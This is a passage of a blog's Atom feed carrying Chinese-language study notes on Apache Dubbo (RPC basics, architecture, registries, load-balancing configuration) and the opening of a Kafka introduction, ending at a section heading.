<li><a href="https://aksakalli.github.io/2012/03/12/database-normalization-and-normal-forms-with-an-example.html" target="_blank" rel="noopener noreferrer">Database Normalization and Normal Forms with an Example</a></li>
<li><a href="https://blog.jcole.us/2014/04/16/the-basics-of-the-innodb-undo-logging-and-history-system/" target="_blank" rel="noopener noreferrer">The basics of the InnoDB undo logging and history system</a></li>
<li><a href="https://www.brightbox.com/blog/2013/10/31/on-mysql-locks/" target="_blank" rel="noopener noreferrer">MySQL locking for the busy web developer</a></li>
<li><a href="https://draveness.me/mysql-innodb" target="_blank" rel="noopener noreferrer">浅入浅出 MySQL 和 InnoDB</a></li>
<li><a href="https://tech.meituan.com/2014/08/20/innodb-lock.html" target="_blank" rel="noopener noreferrer">Innodb 中的事务隔离级别和锁的关系</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Dubbo 介绍</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Dubbo.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Dubbo.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>

<h1 id="dubbo-介绍" tabindex="-1"> Dubbo 介绍</h1>
<h2 id="简介" tabindex="-1"> 简介</h2>
<p>Apache Dubbo (incubating) |ˈdʌbəʊ| 是一款高性能、轻量级的开源Java RPC 框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。简单来说 Dubbo 是一个分布式服务框架，致力于提供高性能和透明化的RPC远程服务调用方案，以及SOA服务治理方案。</p>
<p>Dubbo 目前已经有接近 23k 的 Star ，Dubbo的Github 地址：https://github.com/apache/incubator-dubbo 。 另外，在开源中国举行的2018年度最受欢迎中国开源软件这个活动的评选中，Dubbo 更是凭借其超高人气仅次于 vue.js 和 ECharts 获得第三名的好成绩。</p>
<p>Dubbo 是由阿里开源，后来加入了 Apache 。正式由于 Dubbo 的出现，才使得越来越多的公司开始使用以及接受分布式架构。</p>
<h2 id="rpc" tabindex="-1"> RPC</h2>
<p>RPC（Remote Procedure Call），远程过程调用，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。RPC协议假定某些传输协议的存在，如TCP或UDP，为通信程序之间携带信息数据。在OSI网络通信模型中，RPC跨越了传输层和应用层。RPC使得开发包括网络分布式多程序在内的应用程序更加容易。</p>
<p>RPC采用客户机/服务器模式。请求程序就是一个客户机，而服务提供程序就是一个服务器。首先，客户机调用进程发送一个有进程参数的调用信息到服务进程，然后等待应答信息。在服务器端，进程保持睡眠状态直到调用信息到达为止。当一个调用信息到达，服务器获得进程参数，计算结果，发送答复信息，然后等待下一个调用信息，最后，客户端调用进程接收答复信息，获得进程结果，然后调用执行继续进行。</p>
<p>比如两个不同的服务 A、B 部署在两台不同的机器上，那么服务 A 如果想要调用服务 B 中的某个方法该怎么办呢？使用 HTTP请求 当然可以，但是可能会比较慢而且一些优化做的并不好。 RPC 的出现就是为了解决这个问题。</p>
<p>RPC 主要解决了：<strong>让分布式或者微服务系统中不同服务之间的调用像本地调用一样简单。</strong></p>
<p><img src="@source/assets/cs-note/framework/dubbo/rpc.png" alt="RPC原理图" loading="lazy"></p>
<ol>
<li>服务消费方（client）调用以本地调用方式调用服务；</li>
<li>client stub接收到调用后负责将方法、参数等组装成能够进行网络传输的消息体；</li>
<li>client stub找到服务地址，并将消息发送到服务端；</li>
<li>server stub收到消息后进行解码；</li>
<li>server stub根据解码结果调用本地的服务；</li>
<li>本地服务执行并将结果返回给server stub；</li>
<li>server stub将返回结果打包成消息并发送至消费方；</li>
<li>client stub接收到消息，并进行解码；</li>
<li>服务消费方得到最终结果。</li>
</ol>
<p><img src="@source/assets/cs-note/framework/dubbo/RPC原理时序.png" alt="RPC原理时序图" loading="lazy"></p>
<h3 id="常见的-rpc-框架" tabindex="-1"> 常见的 RPC 框架</h3>
<ul>
<li>
<p><strong>RMI（JDK自带）：</strong> JDK自带的RPC，有很多局限性，不推荐使用。</p>
</li>
<li>
<p><strong>Dubbo:</strong> Dubbo是 阿里巴巴公司开源的一个高性能优秀的服务框架，使得应用可通过高性能的 RPC 实现服务的输出和输入功能，可以和 Spring框架无缝集成。目前 Dubbo 已经成为 Spring Cloud Alibaba 中的官方组件。</p>
</li>
<li>
<p><strong>gRPC</strong> ：gRPC是可以在任何环境中运行的现代开源高性能RPC框架。它可以通过可插拔的支持来有效地连接数据中心内和跨数据中心的服务，以实现负载平衡，跟踪，运行状况检查和身份验证。它也适用于分布式计算的最后一英里，以将设备，移动应用程序和浏览器连接到后端服务。</p>
</li>
<li>
<p><strong>Hessian：</strong> Hessian是一个轻量级的remotingonhttp工具，使用简单的方法提供了RMI的功能。 相比WebService，Hessian更简单、快捷。采用的是二进制RPC协议，因为采用的是二进制协议，所以它很适合于发送二进制数据。</p>
</li>
<li>
<p><strong>Thrift：</strong>  Apache Thrift是Facebook开源的跨语言的RPC通信框架，目前已经捐献给Apache基金会管理，由于其跨语言特性和出色的性能，在很多互联网公司得到应用，有能力的公司甚至会基于thrift研发一套分布式服务框架，增加诸如服务注册、服务发现等功能。</p>
</li>
</ul>
<p>如何进行选择？</p>
<ul>
<li><strong>是否允许代码侵入：</strong>  即需要依赖相应的代码生成器生成代码，比如Thrift。</li>
<li><strong>是否需要长连接获取高性能：</strong>  如果对于性能需求较高的haul，那么可以果断选择基于TCP的Thrift、Dubbo。</li>
<li><strong>是否需要跨越网段、跨越防火墙：</strong> 这种情况一般选择基于HTTP协议的Hessian和Thrift的HTTP Transport。</li>
</ul>
<p>此外，Google推出的基于HTTP2.0的gRPC框架也开始得到应用，其序列化协议基于Protobuf，网络框架使用的是Netty4,但是其需要生成代码，可扩展性也比较差。</p>
<h3 id="rpc-http" tabindex="-1"> RPC HTTP</h3>
<p>RPC 只是一种概念、一种设计，就是为了解决 <strong>不同服务之间的调用问题</strong>, 它一般会包含有 <strong>传输协议</strong> 和 <strong>序列化协议</strong> 这两个。</p>
<p>实现 RPC 的可以传输协议可以直接建立在 TCP 之上，也可以建立在 HTTP 协议之上。大部分 RPC 框架都是使用的 TCP 连接（gRPC使用了HTTP2）。</p>
<p>主要关键就在 HTTP 使用的 TCP 协议，和我们自定义的 TCP 协议在报文上的区别。</p>
<p>http1.1协议的 TCP 报文包含太多在传输过程中可能无用的信息；</p>
<blockquote>
<p>首先要否认一点 HTTP 协议相较于自定义 TCP 报文协议，增加的开销在于连接的建立与断开。HTTP 协议是支持连接池复用的，也就是建立一定数量的连接不断开，并不会频繁的创建和销毁连接。二要说的是 HTTP 也可以使用 Protobuf 这种二进制编码协议对内容进行编码，因此二者最大的区别还是在传输协议上。</p>
</blockquote>
<p><strong>使用自定义 TCP 协议进行传输就会避免上面这个问题，极大地减轻了传输数据的开销。</strong>
这也就是为什么通常会采用自定义 TCP 协议的 RPC来进行进行服务调用的真正原因。
除此之外，成熟的 RPC框架还提供好了“服务自动注册与发现”、&quot;智能负载均衡&quot;、“可视化的服务治理和运维”、“运行期流量调度”等等功能，这些也算是选择RPC 进行服务注册和发现的一方面原因吧！</p>
<h2 id="dubbo-的产生" tabindex="-1"> Dubbo 的产生</h2>
<p>Dubbo 的诞生和 SOA 分布式架构的流行有着莫大的关系。SOA 面向服务的架构（Service Oriented Architecture），也就是把工程按照业务逻辑拆分成服务层、表现层两个工程。服务层中包含业务逻辑，只需要对外提供服务即可。表现层只需要处理和页面的交互，业务逻辑都是调用服务层的服务来实现。SOA架构中有两个主要角色：服务提供者（Provider）和服务使用者（Consumer）。</p>
<h3 id="dubbo的背景" tabindex="-1"> Dubbo的背景</h3>
<p>随着互联网的发展，网站应用的规模不断扩大，常规的垂直应用架构已无法应对，分布式服务架构以及流动计算架构势在必行，亟需一个治理系统确保架构有条不紊的演进。</p>
<p><img src="@source/assets/cs-note/framework/dubbo/dubbo-architecture-roadmap.png" alt="" loading="lazy"></p>
<p><strong>单一应用架构</strong></p>
<p>当网站流量很小时，只需一个应用，将所有功能都部署在一起，以减少部署节点和成本。此时，用于简化增删改查工作量的数据访问框架(ORM)是关键。</p>
<p><strong>垂直应用架构</strong></p>
<p>当访问量逐渐增大，单一应用增加机器带来的加速度越来越小，将应用拆成互不相干的几个应用，以提升效率。此时，用于加速前端页面开发的Web框架(MVC)是关键。</p>
<p><strong>分布式服务架构</strong></p>
<p>当垂直应用越来越多，应用之间交互不可避免，将核心业务抽取出来，作为独立的服务，逐渐形成稳定的服务中心，使前端应用能更快速的响应多变的市场需求。此时，用于提高业务复用及整合的分布式服务框架(RPC)是关键。</p>
<p><strong>流动计算架构</strong></p>
<p>当服务越来越多，容量的评估，小服务资源的浪费等问题逐渐显现，此时需增加一个调度中心基于访问压力实时管理集群容量，提高集群利用率。此时，用于提高机器利用率的资源调度和治理中心(SOA)是关键。</p>
<h3 id="dubbo的需求" tabindex="-1"> Dubbo的需求</h3>
<p><img src="@source/assets/cs-note/framework/dubbo/Dubbo服务治理.png" alt="为什么要用 Dubbo" loading="lazy"></p>
<p>在大规模服务化之前，应用可能只是通过 RMI 或 Hessian 等工具，简单的暴露和引用远程服务，通过配置服务的URL地址进行调用，通过 F5 等硬件进行负载均衡。</p>
<p>当服务越来越多时，服务 URL 配置管理变得非常困难，F5 硬件负载均衡器的单点压力也越来越大。 此时需要一个服务注册中心，动态地注册和发现服务，使服务的位置透明。并通过在消费方获取服务提供方地址列表，实现软负载均衡和 Failover，降低对 F5 硬件负载均衡器的依赖，也能减少部分成本。</p>
<p>当进一步发展，服务间依赖关系变得错踪复杂，甚至分不清哪个应用要在哪个应用之前启动，架构师都不能完整的描述应用的架构关系。 这时，需要自动画出应用间的依赖关系图，以帮助架构师理清理关系。</p>
<p>接着，服务的调用量越来越大，服务的容量问题就暴露出来，这个服务需要多少机器支撑？什么时候该加机器？ 为了解决这些问题，第一步，要将服务现在每天的调用量，响应时间，都统计出来，作为容量规划的参考指标。其次，要可以动态调整权重，在线上，将某台机器的权重一直加大，并在加大的过程中记录响应时间的变化，直到响应时间到达阈值，记录此时的访问量，再以此访问量乘以机器数反推总容量。</p>
<p><strong>Dubbo 的特性</strong></p>
<ol>
<li><strong>负载均衡</strong>：同一个服务部署在不同的机器时该调用那一台机器上的服务。</li>
<li><strong>服务调用链路生成</strong>：随着系统的发展，服务越来越多，服务间依赖关系变得错踪复杂，甚至分不清哪个应用要在哪个应用之前启动，架构师都不能完整的描述应用的架构关系。Dubbo 可以为我们解决服务之间互相是如何调用的。</li>
<li><strong>服务访问压力以及时长统计、资源调度和治理</strong>：基于访问压力实时管理集群容量，提高集群利用率。</li>
<li><strong>服务降级</strong>：某个服务挂掉之后调用备用服务。</li>
</ol>
<p>Dubbo 除了能够应用在分布式系统中，也可以应用在现在比较火的微服务系统中。不过，由于 Spring Cloud 在微服务中应用更加广泛，所以，我觉得一般我们提 Dubbo 的话，大部分是分布式系统的情况。</p>
<h2 id="分布式" tabindex="-1"> 分布式</h2>
<p>分布式或者说 SOA 分布式重要的就是面向服务，说简单的分布式就是我们把整个系统拆分成不同的服务然后将这些服务放在不同的服务器上减轻单体服务的压力提高并发量和性能。比如电商系统可以简单地拆分成订单系统、商品系统、登录系统等等，拆分之后的每个服务可以部署在不同的机器上，如果某一个服务的访问量比较大的话也可以将这个服务同时部署在多台机器上。</p>
<p><strong>为什么要分布式?</strong></p>
<p>从开发角度来讲单体应用的代码都集中在一起，而分布式系统的代码根据业务被拆分。所以，每个团队可以负责一个服务的开发，这样提升了开发效率。另外，代码根据业务拆分之后更加便于维护和扩展。</p>
<p>另外，将系统拆分成分布式之后不仅便于系统扩展和维护，更能提高整个系统的性能。把整个系统拆分成不同的服务/系统，然后每个服务/系统 单独部署在一台服务器上，是不是很大程度上提高了系统性能呢？</p>
<h1 id="dubbo-架构" tabindex="-1"> Dubbo 架构</h1>
<h2 id="dubbo-架构图解" tabindex="-1"> Dubbo 架构图解</h2>
<p><img src="@source/assets/cs-note/framework/dubbo/Dubbo架构.png" alt="Dubbo 架构" loading="lazy"></p>
<p><strong>节点角色说明：</strong></p>
<ul>
<li><strong>Provider：</strong>    暴露服务的服务提供方</li>
<li><strong>Consumer：</strong>    调用远程服务的服务消费方</li>
<li><strong>Registry：</strong>    服务注册与发现的注册中心</li>
<li><strong>Monitor：</strong>     统计服务的调用次数和调用时间的监控中心</li>
<li><strong>Container：</strong>   服务运行容器</li>
</ul>
<p><strong>调用关系说明：</strong></p>
<ol>
<li>服务容器负责启动，加载，运行服务提供者。</li>
<li>服务提供者在启动时，向注册中心注册自己提供的服务。</li>
<li>服务消费者在启动时，向注册中心订阅自己所需的服务。</li>
<li>注册中心返回服务提供者地址列表给消费者，如果有变更，注册中心将基于长连接推送变更数据给消费者。</li>
<li>服务消费者，从提供者地址列表中，基于软负载均衡算法，选一台提供者进行调用，如果调用失败，再选另一台调用。</li>
<li>服务消费者和提供者，在内存中累计调用次数和调用时间，定时每分钟发送一次统计数据到监控中心。</li>
</ol>
<h2 id="dubbo-架构特点" tabindex="-1"> Dubbo 架构特点</h2>
<ul>
<li>连通性</li>
<li>健壮性</li>
<li>伸缩性</li>
<li>升级性</li>
</ul>
<p>总结</p>
<ul>
<li>注册中心负责服务地址的注册与查找，相当于目录服务，服务提供者和消费者只在启动时与注册中心交互，注册中心不转发请求，压力较小</li>
<li>监控中心负责统计各服务调用次数，调用时间等，统计先在内存汇总后每分钟一次发送到监控中心服务器，并以报表展示</li>
<li>注册中心，服务提供者，服务消费者三者之间均为长连接，监控中心除外</li>
<li>注册中心通过长连接感知服务提供者的存在，服务提供者宕机，注册中心将立即推送事件通知消费者</li>
<li>注册中心和监控中心全部宕机，不影响已运行的提供者和消费者，消费者在本地缓存了提供者列表</li>
<li>注册中心和监控中心都是可选的，服务消费者可以直连服务提供者</li>
<li>服务提供者无状态，任意一台宕掉后，不影响使用</li>
<li>服务提供者全部宕掉后，服务消费者应用将无法使用，并无限次重连等待服务提供者恢复</li>
</ul>
<p><strong>连通性</strong></p>
<ul>
<li>注册中心负责服务地址的注册与查找，相当于目录服务，服务提供者和消费者只在启动时与注册中心交互，注册中心不转发请求，压力较小</li>
<li>监控中心负责统计各服务调用次数，调用时间等，统计先在内存汇总后每分钟一次发送到监控中心服务器，并以报表展示</li>
<li>服务提供者向注册中心注册其提供的服务，并汇报调用时间到监控中心，此时间不包含网络开销</li>
<li>服务消费者向注册中心获取服务提供者地址列表，并根据负载算法直接调用提供者，同时汇报调用时间到监控中心，此时间包含网络开销</li>
<li>注册中心，服务提供者，服务消费者三者之间均为长连接，监控中心除外</li>
<li>注册中心通过长连接感知服务提供者的存在，服务提供者宕机，注册中心将立即推送事件通知消费者</li>
<li>注册中心和监控中心全部宕机，不影响已运行的提供者和消费者，消费者在本地缓存了提供者列表</li>
<li>注册中心和监控中心都是可选的，服务消费者可以直连服务提供者</li>
</ul>
<p><strong>健壮性</strong></p>
<ul>
<li>监控中心宕掉不影响使用，只是丢失部分采样数据</li>
<li>数据库宕掉后，注册中心仍能通过缓存提供服务列表查询，但不能注册新服务</li>
<li>注册中心对等集群，任意一台宕掉后，将自动切换到另一台</li>
<li>注册中心全部宕掉后，服务提供者和服务消费者仍能通过本地缓存通讯</li>
<li>服务提供者无状态，任意一台宕掉后，不影响使用</li>
<li>服务提供者全部宕掉后，服务消费者应用将无法使用，并无限次重连等待服务提供者恢复</li>
</ul>
<p><strong>伸缩性</strong></p>
<ul>
<li>注册中心为对等集群，可动态增加机器部署实例，所有客户端将自动发现新的注册中心</li>
<li>服务提供者无状态，可动态增加机器部署实例，注册中心将推送新的服务提供者信息给消费者</li>
</ul>
<p><strong>升级性</strong></p>
<ul>
<li>当服务集群规模进一步扩大，带动IT治理结构进一步升级，需要实现动态部署，进行流动计算，现有分布式服务架构不会带来阻力。</li>
</ul>
<h2 id="dubbo-框架设计" tabindex="-1"> Dubbo 框架设计</h2>
<p><img src="@source/assets/cs-note/framework/dubbo/Dubbo工作原理.png" alt="Dubbo 工作原理" loading="lazy"></p>
<p>图中从下至上分为十层，各层均为单向依赖，右边的黑色箭头代表层之间的依赖关系，每一层都可以剥离上层被复用，其中，Service 和 Config 层为 API，其它各层均为 SPI。</p>
<p><strong>各层说明</strong>：</p>
<ul>
<li>第一层：<strong>service层</strong>，接口层，给服务提供者和消费者来实现的</li>
<li>第二层：<strong>config层</strong>，配置层，主要是对dubbo进行各种配置的</li>
<li>第三层：<strong>proxy层</strong>，服务接口透明代理，生成服务的客户端 Stub 和服务器端 Skeleton</li>
<li>第四层：<strong>registry层</strong>，服务注册层，负责服务的注册与发现</li>
<li>第五层：<strong>cluster层</strong>，集群层，封装多个服务提供者的路由以及负载均衡，将多个实例组合成一个服务</li>
<li>第六层：<strong>monitor层</strong>，监控层，对rpc接口的调用次数和调用时间进行监控</li>
<li>第七层：<strong>protocol层</strong>，远程调用层，封装rpc调用</li>
<li>第八层：<strong>exchange层</strong>，信息交换层，封装请求响应模式，同步转异步</li>
<li>第九层：<strong>transport层</strong>，网络传输层，抽象mina和netty为统一接口</li>
<li>第十层：<strong>serialize层</strong>，数据序列化层，网络传输需要</li>
</ul>
<h1 id="dubbo-的使用" tabindex="-1"> Dubbo 的使用</h1>
<p><a href="http://dubbo.apache.org/zh-cn" target="_blank" rel="noopener noreferrer">Dubbo 中文手册</a></p>
<h2 id="dubbo-的注册中心" tabindex="-1"> Dubbo 的注册中心</h2>
<ul>
<li><strong>Zookeeper</strong> 注册中心(推荐使用)
<ul>
<li>优点:支持网络集群</li>
<li>缺点:稳定性受限于Zookeeper</li>
</ul>
</li>
<li>Redis 注册中心
<ul>
<li>优点:性能高</li>
<li>缺点:对服务器环境要求较高</li>
</ul>
</li>
<li>Multicast 注册中心
<ul>
<li>优点:面中心化,不需要额外安装软件</li>
<li>缺点:建议同机房(局域网)内使用</li>
</ul>
</li>
<li>Simple 注册中心
<ul>
<li>适用于测试环境.不支持集群</li>
</ul>
</li>
</ul>
<h2 id="dubbo-的负载均衡" tabindex="-1"> Dubbo 的负载均衡</h2>
<h3 id="负载均衡" tabindex="-1"> 负载均衡</h3>
<blockquote>
<p>维基百科对负载均衡的定义：负载均衡改善了跨多个计算资源（例如计算机，计算机集群，网络链接，中央处理单元或磁盘驱动的的工作负载分布。负载平衡旨在优化资源使用，最大化吞吐量，最小化响应时间，并避免任何单个资源的过载。使用具有负载平衡而不是单个组件的多个组件可以通过冗余提高可靠性和可用性。负载平衡通常涉及专用软件或硬件。</p>
</blockquote>
<p><strong>用通俗的话说</strong></p>
<p>比如我们的系统中的某个服务的访问量特别大，我们将这个服务部署在了多台服务器上，当客户端发起请求的时候，多台服务器都可以处理这个请求。那么，如何正确选择处理该请求的服务器就很关键。假如，你就要一台服务器来处理该服务的请求，那该服务部署在多台服务器的意义就不复存在了。负载均衡就是为了避免单个服务器响应同一请求，容易造成服务器宕机、崩溃等问题，我们从负载均衡的这四个字就能明显感受到它的意义。</p>
<h3 id="dubbo-的负载均衡策略" tabindex="-1"> Dubbo 的负载均衡策略</h3>
<p>在集群负载均衡时，Dubbo 提供了多种均衡策略，默认为 <code>random</code> 随机调用。可以自行扩展负载均衡策略，参见：<a href="https://dubbo.gitbooks.io/dubbo-dev-book/content/impls/load-balance.html" target="_blank" rel="noopener noreferrer">负载均衡扩展</a>。</p>
<h4 id="random-loadbalance" tabindex="-1"> Random LoadBalance</h4>
<p><strong>基于权重的随机负载均衡机制</strong>(默认)</p>
<ul>
<li><strong>随机，按权重设置随机概率。</strong></li>
<li>在一个截面上碰撞的概率高，但调用量越大分布越均匀，而且按概率使用权重后也比较均匀，有利于动态调整提供者权重。</li>
</ul>
<p><img src="@source/assets/cs-note/framework/dubbo/Dubbo-Random-LoadBalance.png" alt="基于权重的随机负载均衡机制" loading="lazy"></p>
<h4 id="roundrobin-loadbalance" tabindex="-1"> RoundRobin LoadBalance</h4>
<p><strong>基于权重的轮询负载均衡机制</strong>(不推荐)</p>
<ul>
<li>轮循，按公约后的权重设置轮循比率。</li>
<li>存在慢的提供者累积请求的问题，比如：第二台机器很慢，但没挂，当请求调到第二台时就卡在那，久而久之，所有请求都卡在调到第二台上。</li>
</ul>
<p><img src="@source/assets/cs-note/framework/dubbo/Dubbo-RoundRobin-LoadBalance.png" alt="基于权重的轮询负载均衡机制" loading="lazy"></p>
<h4 id="leastactive-loadbalance" tabindex="-1"> LeastActive LoadBalance</h4>
<ul>
<li>最少活跃调用数，相同活跃数的随机，活跃数指调用前后计数差。</li>
<li>使慢的提供者收到更少请求，因为越慢的提供者的调用前后计数差会越大。</li>
</ul>
<h4 id="consistenthash-loadbalance" tabindex="-1"> ConsistentHash LoadBalance</h4>
<p><strong>一致性 Hash，相同参数的请求总是发到同一提供者。(如果需要的不是随机负载均衡，是要一类请求都到一个节点，那就走这个一致性hash策略。)</strong></p>
<ul>
<li>当某一台提供者挂时，原本发往该提供者的请求，基于虚拟节点，平摊到其它提供者，不会引起剧烈变动。</li>
<li>算法参见：http://en.wikipedia.org/wiki/Consistent_hashing</li>
<li>缺省只对第一个参数 Hash，如果要修改，请配置 <code>&lt;dubbo:parameter key=&quot;hash.arguments&quot; value=&quot;0,1&quot; /&gt;</code></li>
<li>缺省用 160 份虚拟节点，如果要修改，请配置 <code>&lt;dubbo:parameter key=&quot;hash.nodes&quot; value=&quot;320&quot; /&gt;</code></li>
</ul>
<h3 id="配置方式" tabindex="-1"> 配置方式</h3>
<p><strong>xml 配置方式</strong></p>
<p>服务端服务级别</p>
<div><pre><code><span>&lt;</span>dubbo<span>:</span>service <span>interface</span><span>=</span><span>"..."</span> loadbalance<span>=</span><span>"roundrobin"</span> <span>/</span><span>></span>
</code></pre></div><p>客户端服务级别</p>
<div><pre><code><span>&lt;</span>dubbo<span>:</span>reference <span>interface</span><span>=</span><span>"..."</span> loadbalance<span>=</span><span>"roundrobin"</span> <span>/</span><span>></span>
</code></pre></div><p>服务端方法级别</p>
<div><pre><code><span>&lt;</span>dubbo<span>:</span>service <span>interface</span><span>=</span><span>"..."</span><span>></span>
    <span>&lt;</span>dubbo<span>:</span>method name<span>=</span><span>"..."</span> loadbalance<span>=</span><span>"roundrobin"</span><span>/</span><span>></span>
<span>&lt;</span><span>/</span>dubbo<span>:</span>service<span>></span>
</code></pre></div><p>客户端方法级别</p>
<div><pre><code><span>&lt;</span>dubbo<span>:</span>reference <span>interface</span><span>=</span><span>"..."</span><span>></span>
    <span>&lt;</span>dubbo<span>:</span>method name<span>=</span><span>"..."</span> loadbalance<span>=</span><span>"roundrobin"</span><span>/</span><span>></span>
<span>&lt;</span><span>/</span>dubbo<span>:</span>reference<span>></span>
</code></pre></div><p><strong>注解配置方式：</strong></p>
<p>消费方基于基于注解的服务级别配置方式：</p>
<div><pre><code><span>@Reference</span><span>(</span>loadbalance <span>=</span> <span>"roundrobin"</span><span>)</span>
<span>HelloService</span> helloService<span>;</span>
</code></pre></div>]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Kafka 介绍</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Kafka.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Kafka.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>

<h1 id="kafka-介绍" tabindex="-1"> Kafka 介绍</h1>
<h2 id="kafka-简介" tabindex="-1"> Kafka 简介</h2>
<p><strong>Kafka 是一种分布式的，基于发布 / 订阅的消息系统。</strong></p>
<p>主要设计目标如下：</p>
<ul>
<li>以时间复杂度为 O(1) 的方式提供消息持久化能力，即使对 TB 级以上数据也能保证常数时间复杂度的访问性能。</li>
<li>高吞吐率。即使在非常廉价的商用机器上也能做到单机支持每秒 100K 条以上消息的传输。</li>
<li>支持 Kafka Server 间的消息分区，及分布式消费，同时保证每个 Partition 内的消息顺序传输。</li>
<li>同时支持离线数据处理和实时数据处理。</li>
<li>Scale out：支持在线水平扩展。</li>
</ul>
<h2 id="kafka-核心概念" tabindex="-1"> Kafka 核心概念</h2>
<h3 id="生产者与消费者" tabindex="-1"> 生产者与消费者</h3>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-生产者和消费者.png" alt="生产者与消费者" loading="lazy"></p>
<p>对于 Kafka 来说客户端有两种基本类型：</p>
<ol>
<li><strong>生产者（Producer）</strong></li>
<li><strong>消费者（Consumer）</strong></li>
</ol>
<p>除此之外，还有用来做数据集成的 Kafka Connect API 和流式处理的 Kafka Streams 等高阶客户端，但这些高阶客户端底层仍然是生产者和消费者API，它们只不过是在上层做了封装。</p>
<p>生产者（也称为发布者）创建消息，而消费者（也称为订阅者）负责订阅和消费消息。</p>
<p><strong>Consumer Group</strong>：同一个Consumer Group中的Consumers，Kafka将相应Topic中的每个消息只发送给其中一个Consumer；消费者用consumerGroup来标识自己。同一个消费组可以并发地消费多个分区的消息，同一个partition也可以由多个consumerGroup并发消费，但是在consumerGroup中一个partition只能由一个consumer消费。</p>
<h3 id="主题-topic-和-分区-partition" tabindex="-1"> 主题(Topic) 和 分区(Partition)</h3>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-主题与分区.png" alt="主题（Topic）与分区（Partition）" loading="lazy"></p>
<p>在 Kafka 中，消息以**主题（Topic）**来分类，每一个主题都对应一个 <strong>「消息队列」</strong>，这有点儿类似于数据库中的表。但是如果我们把所有同类的消息都塞入到一个“中心”队列中，势必缺少可伸缩性，无论是生产者/消费者数目的增加，还是消息数量的增加，都可能耗尽系统的性能或存储。</p>
<p>我们使用一个生活中的例子来说明：现在 A 城市生产的某商品需要运输到 B 城市，走的是公路，那么单通道的高速公路不论是在「A 城市商品增多」还是「现在 C 城市也要往 B 城市运输东西」这样的情况下都会出现「吞吐量不足」的问题。所以我们现在引入**分区（Partition）**的概念，类似“允许多修几条道”的方式对我们的主题完成了水平扩展。</p>
<p>消息的主题、队列，每一个消息都有它的topic，Kafka通过topic对消息进行归类。Kafka中可以将Topic从物理上划分成一个或多个分区（Partition），每个分区在物理上对应一个文件夹，以“topicName_partitionIndex”的命名方式命名，该目录包含了这个分区的所有消息(.log)和索引文件(.index)，这使得Kafka的吞吐率可以水平扩展。</p>
<h3 id="broker-和-cluster" tabindex="-1"> Broker 和 Cluster</h3>
<p>一个 Kafka 服务器也称为 Broker，它接受生产者发送的消息并存入磁盘；Broker 同时服务消费者拉取分区消息的请求，返回目前已经提交的消息。使用特定的机器硬件，一个 Broker 每秒可以处理成千上万的分区和百万量级的消息。</p>
<p>若干个 Broker 组成一个集群（Cluster），其中集群内某个 Broker 会成为集群控制器（Cluster Controller），它负责管理集群，包括分配分区到 Broker、监控 Broker 故障等。在集群内，一个分区由一个 Broker 负责，这个 Broker 也称为这个分区的 Leader；当然一个分区可以被复制到多个 Broker 上来实现冗余，这样当存在 Broker 故障时可以将其分区重新分配到其他 Broker 来负责。下图是一个样例：</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-Broker和集群.png" alt="Broker和集群" loading="lazy"></p>
<p>Kafka 的一个关键性质是日志保留（retention），我们可以配置主题的消息保留策略，譬如只保留一段时间的日志或者只保留特定大小的日志。当超过这些限制时，老的消息会被删除。我们也可以针对某个主题单独设置消息过期策略，这样对于不同应用可以实现个性化。</p>
<h3 id="多集群" tabindex="-1"> 多集群</h3>
<p>随着业务发展，我们往往需要多集群，通常处于下面几个原因：</p>
<ul>
<li>基于数据的隔离；</li>
<li>基于安全的隔离；</li>
<li>多数据中心（容灾）</li>
</ul>
<p>当构建多个数据中心时，往往需要实现消息互通。举个例子，假如用户修改了个人资料，那么后续的请求无论被哪个数据中心处理，这个更新需要反映出来。又或者，多个数据中心的数据需要汇总到一个总控中心来做数据分析。</p>
<p>上面说的分区复制冗余机制只适用于同一个 Kafka 集群内部，对于多个 Kafka 集群消息同步可以使用 Kafka 提供的 MirrorMaker 工具。本质上来说，MirrorMaker 只是一个 Kafka 消费者和生产者，并使用一个队列连接起来而已。它从一个集群中消费消息，然后往另一个集群生产消息。</p>
<h1 id="kafka-设计与实现" tabindex="-1"> Kafka 设计与实现</h1>
<h2 id="kafka-架构" tabindex="-1"> Kafka 架构</h2>
<p>能够发布和订阅消息流（类似于消息队列） 以容错的、持久的方式存储消息流 多分区概念，提高了并行能力</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka架构.png" alt="" loading="lazy"></p>
<h2 id="kafka-文件系统作为存储" tabindex="-1"> Kafka 文件系统作为存储</h2>
